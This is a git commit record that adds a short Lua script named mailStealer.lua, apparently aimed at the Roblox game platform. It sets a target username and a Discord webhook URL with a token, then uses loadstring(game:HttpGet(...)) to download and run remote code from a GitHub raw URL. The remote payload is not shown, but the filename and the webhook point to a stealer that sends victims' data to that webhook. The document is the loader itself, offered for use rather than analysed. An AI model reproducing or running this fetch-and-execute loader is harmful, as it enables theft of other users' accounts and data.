02faa03ac3743cefdd27ca8fe158f15f8c6a6adc
WOKAWIKK <147245517+WOKAWIKK@users.noreply.github.com>
2024-11-12 18:36:22 +0700

    Add files via upload

---
+++ mailStealer.lua
@@ -0,0 +1,5 @@
+_G.username = "uehfuf78247"
+_G.Webhook = "https://discord.com/api/webhooks/1305497839585198101/fvHA6LTAlnPXMnLnCijiQ4bEvE5ry-OGfDslamas4kWsaib0eVr2_KadxTSLdGeAbvKO"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/eon...",true))();
+
